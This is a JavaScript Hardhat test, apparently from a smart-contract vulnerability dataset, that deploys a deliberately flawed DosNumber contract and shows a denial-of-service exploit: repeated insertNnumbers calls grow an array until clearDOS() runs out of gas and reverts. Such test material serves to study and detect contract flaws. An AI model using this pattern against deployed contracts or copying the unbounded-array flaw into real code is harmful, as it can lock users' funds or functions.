const { loadFixture, mine } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack denial_of_service/dos_number.sol', function () {
    async function deployContracts() {

        const DosNumber = await ethers.getContractFactory('contracts/dataset/denial_of_service/dos_number.sol:DosNumber');
        const victim = await DosNumber.deploy();
        await victim.waitForDeployment();

    return {victim};
    }

  
    it('exploit denial of service vulnerability', async function () {
        const {victim} = await loadFixture(deployContracts);

        // add enough numbers to make the contract run out of gas when emptying the array
        for (let i = 0; i < 17; i++) {
            await victim.insertNnumbers(1, 350);
        }
        
        await expect(victim.clearDOS()).to.be.reverted;

    });
  });